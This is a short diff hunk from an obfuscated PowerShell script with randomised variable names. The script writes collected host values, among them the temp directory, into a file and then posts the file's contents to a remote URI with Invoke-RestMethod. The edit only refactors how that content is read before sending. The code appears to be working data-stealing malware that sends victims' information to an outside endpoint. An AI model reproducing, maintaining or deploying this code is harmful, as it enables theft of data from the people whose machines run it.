@@ -36,9 +36,10 @@ Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
 Add-Content -Path $CRYnrkaDbe -Value $env:temp
 Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs
+$xehGLcIRou = Get-Content $CRYnrkaDbe 
 $xmWrZacmJz = @{
     'username' = 'Config'
-    'content' = Get-Content $CRYnrkaDbe 
+    'content' = $xehGLcIRou
 }
 Invoke-RestMethod -Uri $PEBgxuJUfd -Method 'post' -Body $xmWrZacmJz
 mkdir $qsQBioVOkY
